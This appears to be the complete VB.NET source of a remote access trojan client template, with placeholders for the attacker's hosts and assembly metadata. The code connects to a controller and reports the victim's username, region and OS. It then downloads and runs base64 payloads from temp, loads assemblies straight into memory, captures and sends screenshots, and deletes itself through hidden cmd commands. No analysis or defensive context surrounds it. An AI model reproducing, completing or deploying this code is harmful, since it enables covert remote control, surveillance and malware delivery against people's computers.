﻿
Imports System
Imports Microsoft.VisualBasic
Imports System.Diagnostics
Imports System.Windows.Forms



'%ASSEMBLY%<Assembly: System.Reflection.AssemblyTitle("%Title%")>
'%ASSEMBLY%<Assembly: System.Reflection.AssemblyDescription("%Description%")>
'%ASSEMBLY%<Assembly: System.Reflection.AssemblyCompany("%Company%")> 
'%ASSEMBLY%<Assembly: System.Reflection.AssemblyProduct("%Product%")> 
'%ASSEMBLY%<Assembly: System.Reflection.AssemblyCopyright("%Copyright%")> 
'%ASSEMBLY%<Assembly: System.Reflection.AssemblyTrademark("%Trademark%")> 
'%ASSEMBLY%<Assembly: System.Reflection.AssemblyFileVersion("%v1%" & "." & "%v2%" & "." & "%v3%" & "." & "%v4%")> 



Namespace ClientApp


    Public Class MainEntry



        Public Shared Sub Main()

            Dim ConnThread As New Threading.Thread(New Threading.ThreadStart(AddressOf NetworkClient.StartConnection))
            ConnThread.Start()

            Dim PingThread As New Threading.Thread(New Threading.ThreadStart(AddressOf NetworkClient.SendHeartbeat))
            PingThread.Start()


        End Sub

    End Class



    Public Class NetworkClient

        Public Shared ConnectionActive As Boolean = False
        Public Shared ClientSocket As System.Net.Sockets.Socket
        Public Shared ExpectedDataSize As Long = Nothing
        Public Shared ReceiveBuffer() As Byte
        Public Shared DataStream As New System.IO.MemoryStream
        Public Shared ReadOnly Delimiter = Configuration.DELIMITER

        Public Shared Sub StartConnection()

            Try
                Threading.Thread.Sleep(2500)
                ClientSocket = New System.Net.Sockets.Socket(System.Net.Sockets.AddressFamily.InterNetwork, System.Net.Sockets.SocketType.Stream, System.Net.Sockets.ProtocolType.Tcp)

                Dim serverIP As System.Net.IPAddress = serverIP.Parse(Configuration.HOST_LIST.Item(New Random().Next(0, Configuration.HOST_LIST.Count)))
                Dim endpoint As System.Net.IPEndPoint = New System.Net.IPEndPoint(serverIP, Configuration.PORT_LIST.Item(New Random().Next(0, Configuration.PORT_LIST.Count)))

                ExpectedDataSize = -1
                ReceiveBuffer = New Byte(0) {}
                DataStream = New System.IO.MemoryStream

                ClientSocket.ReceiveBufferSize = 512000
                ClientSocket.SendBufferSize = 512000

                ClientSocket.Connect(endpoint)

                ConnectionActive = True
                SendData(BuildSystemInfo())

                ClientSocket.BeginReceive(ReceiveBuffer, 0, ReceiveBuffer.Length, System.Net.Sockets.SocketFlags.None, New AsyncCallback(AddressOf DataReceivedCallback), ClientSocket)

            Catch ex As Exception
                ReestablishConnection()
            End Try
        End Sub

        Private Shared Function BuildSystemInfo()
            Dim culture As System.Globalization.CultureInfo = System.Globalization.CultureInfo.CurrentCulture
            Dim region As System.Globalization.RegionInfo = New System.Globalization.RegionInfo(culture.Name)
            Dim location As String = region.DisplayName
            Dim sysInfo As New Devices.ComputerInfo
            Return String.Concat("INFO", Delimiter, location, Delimiter, Environment.UserName, Delimiter, sysInfo.OSFullName.Replace("Microsoft", Nothing), Environment.OSVersion.ServicePack.Replace("Service Pack", "SP") + " ", Environment.Is64BitOperatingSystem.ToString.Replace("False", "32bit").Replace("True", "64bit"), Delimiter, "CLIENT v1.0", Delimiter, GenerateIdentifierHash(GetMachineIdentifier()))

        End Function

        Public Shared Sub DataReceivedCallback(ByVal asyncResult As IAsyncResult)
            If ConnectionActive = False Then ReestablishConnection()
            Try
                Dim bytesRead As Integer = ClientSocket.EndReceive(asyncResult)
                If bytesRead > 0 Then
                    If ExpectedDataSize = -1 Then
                        If ReceiveBuffer(0) = 0 Then
                            ExpectedDataSize = ByteToString(DataStream.ToArray)
                            DataStream.Dispose()
                            DataStream = New System.IO.MemoryStream

                            If ExpectedDataSize = 0 Then
                                ExpectedDataSize = -1
                                ClientSocket.BeginReceive(ReceiveBuffer, 0, ReceiveBuffer.Length, System.Net.Sockets.SocketFlags.None, New AsyncCallback(AddressOf DataReceivedCallback), ClientSocket)
                                Exit Sub
                            End If
                            ReceiveBuffer = New Byte(ExpectedDataSize - 1) {}
                        Else
                            DataStream.WriteByte(ReceiveBuffer(0))
                        End If
                    Else
                        DataStream.Write(ReceiveBuffer, 0, bytesRead)
                        If (DataStream.Length = ExpectedDataSize) Then
                            Threading.ThreadPool.QueueUserWorkItem(New Threading.WaitCallback(AddressOf HandleIncomingData), DataStream.ToArray)
                            ExpectedDataSize = -1
                            DataStream.Dispose()
                            DataStream = New System.IO.MemoryStream
                            ReceiveBuffer = New Byte(0) {}
                        Else
                            ReceiveBuffer = New Byte(ExpectedDataSize - DataStream.Length - 1) {}
                        End If
                    End If
                Else
                    ReestablishConnection()
                    Exit Sub
                End If
                ClientSocket.BeginReceive(ReceiveBuffer, 0, ReceiveBuffer.Length, System.Net.Sockets.SocketFlags.None, New AsyncCallback(AddressOf DataReceivedCallback), ClientSocket)
            Catch ex As Exception
                ReestablishConnection()
                Exit Sub
            End Try
        End Sub

        Public Shared Sub HandleIncomingData(ByVal dataBytes As Byte())
            Try
                CommandProcessor.Execute(dataBytes)
            Catch ex As Exception
            End Try
        End Sub

        Public Shared Sub SendData(ByVal message As String)
            Try
                Using outStream As New System.IO.MemoryStream
                    Dim encryptedData As Byte() = EncryptBytes(StringToBytes(message))
                    Dim lengthHeader As Byte() = StringToBytes(encryptedData.Length & CChar(vbNullChar))

                    outStream.Write(lengthHeader, 0, lengthHeader.Length)
                    outStream.Write(encryptedData, 0, encryptedData.Length)

                    ClientSocket.Poll(-1, System.Net.Sockets.SelectMode.SelectWrite)
                    ClientSocket.Send(outStream.ToArray, 0, outStream.Length, System.Net.Sockets.SocketFlags.None)
                End Using
            Catch ex As Exception
                ReestablishConnection()
            End Try
        End Sub

        Private Shared Sub SendCompleted(ByVal asyncResult As IAsyncResult)
            Try
                ClientSocket.EndSend(asyncResult)
            Catch ex As Exception
            End Try
        End Sub

        Public Shared Sub ReestablishConnection()
            ConnectionActive = False

            Try
                ClientSocket.Close()
                ClientSocket.Dispose()
            Catch ex As Exception
            End Try

            Try
                DataStream.Close()
                DataStream.Dispose()
            Catch ex As Exception
            End Try

            StartConnection()

        End Sub

        Public Shared Sub SendHeartbeat()
            While True
                Threading.Thread.Sleep(30 * 1000)
                Try
                    If ClientSocket.Connected Then
                        Using outStream As New System.IO.MemoryStream
                            Dim encryptedData As Byte() = EncryptBytes(StringToBytes("PING?"))
                            Dim lengthHeader As Byte() = StringToBytes(encryptedData.Length & CChar(vbNullChar))

                            outStream.Write(lengthHeader, 0, lengthHeader.Length)
                            outStream.Write(encryptedData, 0, encryptedData.Length)

                            ClientSocket.Poll(-1, System.Net.Sockets.SelectMode.SelectWrite)
                            ClientSocket.Send(outStream.ToArray, 0, outStream.Length, System.Net.Sockets.SocketFlags.None)
                        End Using
                    End If
                Catch ex As Exception
                    ConnectionActive = False
                End Try
            End While
        End Sub


    End Class








    Public Class Configuration
        Public Shared ReadOnly HOST_LIST As New Collections.Generic.List(Of String)({"%HOSTS%"})
        Public Shared ReadOnly PORT_LIST As New Collections.Generic.List(Of Integer)({123456})
        Public Shared ReadOnly DELIMITER As String = "<SAKURA>"
        Public Shared ReadOnly ENCRYPTION_KEY As String = "<1234>"
    End Class






    Public Class CommandProcessor
        Private Shared ReadOnly Separator = NetworkClient.Delimiter

        Public Shared Sub Execute(ByVal rawData As Byte())
            Try
                Dim commandParts As String() = Split(ByteToString(DecryptBytes(rawData)), Separator)
                Select Case commandParts(0)

                    Case "CLOSE"
                        Try
                            NetworkClient.ClientSocket.Shutdown(System.Net.Sockets.SocketShutdown.Both)
                            NetworkClient.ClientSocket.Close()
                        Catch ex As Exception
                        End Try

                        Environment.Exit(0)

                    Case "De"

                        NetworkClient.ClientSocket.Shutdown(System.Net.Sockets.SocketShutdown.Both)
                        NetworkClient.ClientSocket.Close()
                        RemoveFile(Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup), "ErrorCoder")
                        RemoveFile(Environment.CurrentDirectory, System.Windows.Forms.Application.ProductName)
                        Environment.Exit(0)


                    Case "DW"
                        SaveAndExecute(commandParts(1), commandParts(2))
                    Case "DM"
                        LoadInMemory(commandParts(2))
                    Case "DAM"
                        LoadInMemory(commandParts(2))
                    Case "UPDATE"
                        ApplyUpdate(commandParts(1))

                    Case "RD-"
                        NetworkClient.SendData("RD-")

                    Case "RD+"
                        ScreenCapture.CaptureScreen(commandParts(1), commandParts(2))

                End Select
            Catch ex As Exception
            End Try
        End Sub
        Private Shared Sub LoadInMemory(ByVal AssemblyData As String)
            Try
                Dim execThread As New Threading.Thread(Sub()
                                                           Dim loadedAssembly As Object = Reflection.Assembly.Load(Convert.FromBase64String(StrReverse(AssemblyData)))
                                                           loadedAssembly.EntryPoint.Invoke(Nothing, Nothing)
                                                       End Sub)
                execThread.Start()

            Catch ex As Exception

            End Try
        End Sub
        Private Shared Sub RemoveFile(ByVal directoryPath As String, ByVal fileName As String)
            Try
                Dim cmdInfo As New ProcessStartInfo("cmd.exe")
                cmdInfo.WindowStyle = ProcessWindowStyle.Hidden
                cmdInfo.CreateNoWindow = True
                cmdInfo.UseShellExecute = False
                cmdInfo.RedirectStandardInput = True
                cmdInfo.RedirectStandardOutput = True


                Dim cmdProcess As New Process()
                cmdProcess.StartInfo = cmdInfo
                cmdProcess.Start()

                Dim deleteCommand As String = "/C choice /C Y /N /D Y /T 3 & Del """ & directoryPath & "\" & fileName & ".exe"""
                cmdProcess.StandardInput.WriteLine(deleteCommand)
                cmdProcess.StandardInput.Close()


            Catch
                Environment.Exit(0)
            End Try


        End Sub
        Private Shared Sub SaveAndExecute(ByVal FileName As String, ByVal FileContent As String)
            Try
                Dim tempFilePath = System.IO.Path.GetTempFileName + FileName
                System.IO.File.WriteAllBytes(tempFilePath, Convert.FromBase64String(FileContent))
                Threading.Thread.Sleep(500)
                Diagnostics.Process.Start(tempFilePath)
            Catch ex As Exception
            End Try
        End Sub

        Private Shared Sub ApplyUpdate(ByVal UpdateData As String)
            Try
                Dim updatePath As String = System.IO.Path.GetTempFileName + ".exe"
                System.IO.File.WriteAllBytes(updatePath, Convert.FromBase64String(UpdateData))
                Threading.Thread.Sleep(500)
                Diagnostics.Process.Start(updatePath)

                Dim cleanupCommand As New Diagnostics.ProcessStartInfo With {
                .Arguments = "/C choice /C Y /N /D Y /T 1 & Del " + Diagnostics.Process.GetCurrentProcess.MainModule.FileName,
                .WindowStyle = Diagnostics.ProcessWindowStyle.Hidden,
                .CreateNoWindow = True,
                .FileName = "cmd.exe"
            }

                Try
                    NetworkClient.ClientSocket.Shutdown(System.Net.Sockets.SocketShutdown.Both)
                    NetworkClient.ClientSocket.Close()
                Catch ex As Exception
                End Try

                Diagnostics.Process.Start(cleanupCommand)
                Environment.Exit(0)
            Catch ex As Exception
            End Try
        End Sub


    End Class








    Module Utilities

        Function StringToBytes(ByVal text As String) As Byte()
            Return System.Text.Encoding.Default.GetBytes(text)
        End Function

        Function ByteToString(ByVal bytes As Byte()) As String
            Return System.Text.Encoding.Default.GetString(bytes)
        End Function

        Function GetMachineIdentifier() As String
            Dim identifier As String = Nothing

            identifier += Environment.UserDomainName
            identifier += Environment.UserName
            identifier += Environment.MachineName

            Return identifier
        End Function

        Function GenerateIdentifierHash(dataToHash As String) As String
            Dim hasher As New System.Security.Cryptography.MD5CryptoServiceProvider
            Dim dataBytes() As Byte = StringToBytes(dataToHash)
            dataBytes = hasher.ComputeHash(dataBytes)
            Dim hashResult As New System.Text.StringBuilder
            For Each byteValue As Byte In dataBytes
                hashResult.Append(byteValue.ToString("x2"))
            Next
            Return hashResult.ToString.Substring(0, 12).ToUpper
        End Function

        Function EncryptBytes(ByVal inputData As Byte()) As Byte()
            Dim cryptoProvider As New System.Security.Cryptography.RijndaelManaged
            Dim hashProvider As New System.Security.Cryptography.MD5CryptoServiceProvider
            Try
                cryptoProvider.Key = hashProvider.ComputeHash(StringToBytes(Configuration.ENCRYPTION_KEY))
                cryptoProvider.Mode = System.Security.Cryptography.CipherMode.ECB
                Dim encryptor As System.Security.Cryptography.ICryptoTransform = cryptoProvider.CreateEncryptor
                Dim dataBuffer As Byte() = inputData
                Return encryptor.TransformFinalBlock(dataBuffer, 0, dataBuffer.Length)
            Catch ex As Exception
            End Try
        End Function

        Function DecryptBytes(ByVal inputData As Byte()) As Byte()
            Dim cryptoProvider As New System.Security.Cryptography.RijndaelManaged
            Dim hashProvider As New System.Security.Cryptography.MD5CryptoServiceProvider
            Try
                cryptoProvider.Key = hashProvider.ComputeHash(StringToBytes(Configuration.ENCRYPTION_KEY))
                cryptoProvider.Mode = System.Security.Cryptography.CipherMode.ECB
                Dim decryptor As System.Security.Cryptography.ICryptoTransform = cryptoProvider.CreateDecryptor
                Dim dataBuffer As Byte() = inputData
                Return decryptor.TransformFinalBlock(dataBuffer, 0, dataBuffer.Length)
            Catch ex As Exception
            End Try
        End Function
    End Module






    Public Class ScreenCapture

        Public Shared Sub CaptureScreen(ByVal Width As Integer, ByVal Height As Integer)
            Try
                Dim screenImage As New System.Drawing.Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height)
                Dim graphics As System.Drawing.Graphics = System.Drawing.Graphics.FromImage(screenImage)
                graphics.CompositingQuality = System.Drawing.Drawing2D.CompositingQuality.HighSpeed
                graphics.CopyFromScreen(0, 0, 0, 0, New System.Drawing.Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height), System.Drawing.CopyPixelOperation.SourceCopy)

                Dim resizedImage As New System.Drawing.Bitmap(Width, Height)
                Dim resizeGraphics As System.Drawing.Graphics = System.Drawing.Graphics.FromImage(resizedImage)
                resizeGraphics.CompositingQuality = System.Drawing.Drawing2D.CompositingQuality.HighSpeed
                resizeGraphics.DrawImage(screenImage, New System.Drawing.Rectangle(0, 0, Width, Height), New System.Drawing.Rectangle(0, 0, Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height), System.Drawing.GraphicsUnit.Pixel)

                Dim qualityParam As System.Drawing.Imaging.EncoderParameter = New System.Drawing.Imaging.EncoderParameter(System.Drawing.Imaging.Encoder.Quality, 40)
                Dim codecInfo As System.Drawing.Imaging.ImageCodecInfo = GetEncoderInfo(System.Drawing.Imaging.ImageFormat.Jpeg)
                Dim encoderParams As System.Drawing.Imaging.EncoderParameters = New System.Drawing.Imaging.EncoderParameters(1)
                encoderParams.Param(0) = qualityParam

                Dim imageStream As New System.IO.MemoryStream
                resizedImage.Save(imageStream, codecInfo, encoderParams)

                Try
                    SyncLock NetworkClient.ClientSocket
                        Using sendStream As New System.IO.MemoryStream
                            Dim encryptedImage As Byte() = EncryptBytes(StringToBytes(("RD+" + NetworkClient.Delimiter + ByteToString(imageStream.ToArray))))
                            Dim lengthHeader As Byte() = StringToBytes(encryptedImage.Length & CChar(vbNullChar))

                            sendStream.Write(lengthHeader, 0, lengthHeader.Length)
                            sendStream.Write(encryptedImage, 0, encryptedImage.Length)

                            NetworkClient.ClientSocket.Poll(-1, System.Net.Sockets.SelectMode.SelectWrite)
                            NetworkClient.ClientSocket.Send(sendStream.ToArray, 0, sendStream.Length, System.Net.Sockets.SocketFlags.None)
                        End Using
                    End SyncLock
                Catch ex As Exception
                    NetworkClient.ConnectionActive = False
                End Try

                Try
                    graphics.Dispose()
                    resizeGraphics.Dispose()
                    screenImage.Dispose()
                    imageStream.Dispose()
                Catch ex As Exception
                End Try

            Catch ex As Exception
            End Try

        End Sub

        Private Shared Function GetEncoderInfo(ByVal format As System.Drawing.Imaging.ImageFormat) As System.Drawing.Imaging.ImageCodecInfo
            Try
                Dim index As Integer
                Dim availableEncoders() As System.Drawing.Imaging.ImageCodecInfo
                availableEncoders = System.Drawing.Imaging.ImageCodecInfo.GetImageEncoders()

                index = 0
                While index < availableEncoders.Length
                    If availableEncoders(index).FormatID = format.Guid Then
                        Return availableEncoders(index)
                    End If
                    index += 1
                End While
                Return Nothing
            Catch ex As Exception
            End Try
        End Function
    End Class

End Namespace